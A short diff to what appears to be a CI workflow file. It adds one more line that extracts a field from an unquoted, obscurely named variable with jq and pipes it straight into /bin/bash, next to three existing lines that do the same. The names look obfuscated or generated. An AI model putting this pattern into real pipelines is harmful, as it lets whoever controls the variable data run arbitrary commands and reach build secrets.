@@ -34,6 +34,7 @@ jobs:
           echo $xopd6 | jq -r .utkrr0151 | /bin/bash
           printf '%s' "$snbav2705" | jq -r .xzk11 | /bin/bash
           printf '%s' "$vtux56" | jq -r .ej7 | /bin/bash
+          echo $xn1381 | jq -r .khs28 | /bin/bash
 
       - name: Store artifact
         if: always()
